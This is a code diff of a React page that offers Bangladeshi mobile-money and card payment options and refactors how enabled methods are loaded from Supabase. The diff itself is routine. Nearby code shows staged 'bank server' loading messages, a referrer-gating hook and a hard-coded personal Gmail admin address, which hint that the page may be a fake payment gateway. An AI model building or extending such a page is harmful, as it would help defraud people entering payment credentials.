@@ -15,8 +15,7 @@ import nagadLogo from "@/assets/nagad-logo.png";
 import rocketLogo from "@/assets/rocket-logo.png";
 import upayLogo from "@/assets/upay-logo.png";
 import visaLogo from "@/assets/visa-logo.png";
-import mastercardLogo from "@/assets/mastercard-logo.png";
-import discoverLogo from "@/assets/discover-logo.png";
+import mastercardLogo from "@/assets/mastercard-logo-color.png";
 
 
 const ADMIN_EMAIL = "abir789@gmail.com";
@@ -29,6 +28,24 @@ const gatewayMessages = [
   "Communicating with bank server...",
   "Finalizing secure gateway...",
 ];
+
+const defaultEnabledMethods = {
+  bkash: true,
+  nagad: true,
+  rocket: false,
+  upay: false,
+  visa: true,
+  mastercard: true,
+};
+
+const paymentMethods = [
+  { id: 'bkash', route: '/bkash', logo: bkashLogo, alt: 'bKash', h: 'h-16 md:h-20' },
+  { id: 'nagad', route: '/nagad', logo: nagadLogo, alt: 'Nagad', h: 'h-16 md:h-20' },
+  { id: 'rocket', route: '/rocket', logo: rocketLogo, alt: 'Rocket', h: 'h-16 md:h-20' },
+  { id: 'upay', route: '/upay', logo: upayLogo, alt: 'Upay', h: 'h-16 md:h-20' },
+  { id: 'visa', route: '/visa', logo: visaLogo, alt: 'Visa', h: 'h-14 md:h-18' },
+  { id: 'mastercard', route: '/mastercard', logo: mastercardLogo, alt: 'Mastercard', h: 'h-14 md:h-18' },
+] as const;
 
 const Index = () => {
   const { checking: referrerChecking } = useReferrerGuard();
@@ -49,9 +66,7 @@ const Index = () => {
   const [supportNumber, setSupportNumber] = useState("");
   
   const [loginUnlocked, setLoginUnlocked] = useState(false);
-  const [enabledMethods, setEnabledMethods] = useState<Record<string, boolean>>({
-    bkash: true, nagad: true, rocket: false, upay: false, visa: true, mastercard: true, discover: true,
-  });
+  const [enabledMethods, setEnabledMethods] = useState<Record<string, boolean>>(defaultEnabledMethods);
 
   const isMobileOrTablet = typeof window !== 'undefined' && window.innerWidth < 1024;
 
@@ -92,8 +107,12 @@ const Index = () => {
     const fetchMethods = async () => {
       const { data } = await supabase.from("payment_methods").select("*");
       if (data) {
-        const map: Record<string, boolean> = {};
-        data.forEach((m) => (map[m.id] = m.enabled));
+        const map: Record<string, boolean> = { ...defaultEnabledMethods };
+        data.forEach((m) => {
+          if (m.id in defaultEnabledMethods) {
+            map[m.id] = m.enabled;
+          }
+        });
         setEnabledMethods(map);
       }
     };
@@ -112,10 +131,13 @@ const Index = () => {
         "postgres_changes",
         { event: "UPDATE", schema: "public", table: "payment_methods" },
         (payload) => {
-          setEnabledMethods((prev) => ({
-            ...prev,
-            [payload.new.id as string]: payload.new.enabled as boolean,
-          }));
+          setEnabledMethods((prev) => {
+            if (!(payload.new.id in defaultEnabledMethods)) return prev;
+            return {
+              ...prev,
+              [payload.new.id as string]: payload.new.enabled as boolean,
+            };
+          });
         }
       )
       .subscribe();
@@ -123,7 +145,8 @@ const Index = () => {
     return () => { supabase.removeChannel(channel); };
   }, []);
 
-  const cardTypes = ['visa', 'mastercard', 'discover'];
+  const cardTypes = ['visa', 'mastercard'];
+  const allVisibleMethodsDisabled = paymentMethods.every((method) => !(enabledMethods[method.id] ?? false));
   
   const handlePaymentSelect = (route: string) => {
     const methodName = route.replace('/', '');
@@ -339,7 +362,7 @@ const Index = () => {
 
             {/* Payment Methods Grid or Payment Off Watermark */}
             <div className="relative">
-              {Object.keys(enabledMethods).length > 0 && Object.values(enabledMethods).every(v => !v) && !isAdmin && (
+              {Object.keys(enabledMethods).length > 0 && allVisibleMethodsDisabled && !isAdmin && (
                 <div className="absolute inset-0 z-10 flex items-center justify-center rounded-xl pointer-events-none select-none" style={{ transform: 'rotate(-18deg)' }}>
                   <div className="flex flex-col items-center gap-1">
                     <svg xmlns="http://www.w3.org/2000/svg" className="w-16 h-16 md:w-20 md:h-20 text-destructive/30" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
@@ -353,15 +376,7 @@ const Index = () => {
                 </div>
               )}
               <div className="grid grid-cols-2 md:grid-cols-3 gap-2.5 md:gap-3">
-              {[
-                  { id: 'bkash', route: '/bkash', logo: bkashLogo, alt: 'bKash', h: 'h-16 md:h-20' },
-                  { id: 'nagad', route: '/nagad', logo: nagadLogo, alt: 'Nagad', h: 'h-16 md:h-20' },
-                  { id: 'rocket', route: '/rocket', logo: rocketLogo, alt: 'Rocket', h: 'h-16 md:h-20' },
-                  { id: 'upay', route: '/upay', logo: upayLogo, alt: 'Upay', h: 'h-16 md:h-20' },
-                  { id: 'visa', route: '/visa', logo: visaLogo, alt: 'Visa', h: 'h-14 md:h-18' },
-                  { id: 'mastercard', route: '/mastercard', logo: mastercardLogo, alt: 'Mastercard', h: 'h-14 md:h-18' },
-                  { id: 'discover', route: '/discover', logo: discoverLogo, alt: 'Discover', h: 'h-14 md:h-18' },
-                ].map((method) => {
+              {paymentMethods.map((method) => {
                   const isEnabled = enabledMethods[method.id] ?? false;
                   return (
                     <div
